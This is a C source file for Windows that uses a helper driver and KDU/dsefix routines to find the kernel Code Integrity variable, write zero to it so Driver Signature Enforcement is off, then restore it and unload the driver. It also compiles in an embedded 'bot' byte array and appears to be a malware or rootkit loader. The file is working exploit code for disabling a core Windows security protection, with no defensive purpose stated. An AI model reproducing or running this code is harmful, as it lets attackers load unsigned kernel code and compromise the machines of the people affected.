#include <Windows.h>
#include <winternl.h>
#include <stdint.h>

#ifdef DEBUG
#include <stdio.h>
#endif

#include "driver.h"
#include "util.h"
#include "KDU/dsefix.h"
#include "ntdll.h"

uint8_t bot[] = 
#include "bot.h"
;

int main(int argc, char *argv[]) {
	OSVERSIONINFO version;
	uint32_t origData;
	ULONG_PTR ciAddr;

	rand_init();
	driver_open();
	driver_init();

	RtlSecureZeroMemory(&version, sizeof(version));
	version.dwOSVersionInfoSize = sizeof(version);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&version);

	ciAddr = KDUQueryCodeIntegrityVariableAddress(version.dwBuildNumber);
	printf("Code Integrity Addr: 0x%X\n", ciAddr);
	printf("Data: 0x%X\n", origData = driver_read32((PBYTE)ciAddr));

	printf("Next up... DISABLE!!!\n");
	system("pause");

	driver_write32((PBYTE)ciAddr, 0);

	printf("Next up... ENABLE!!!\n");
	system("pause");

	driver_write32((PBYTE)ciAddr, origData);

	printf("Next up... UNLOAD!!!\n");
	system("pause");
	driver_close();

	printf("UNLOAD\n");
	return 0;
}
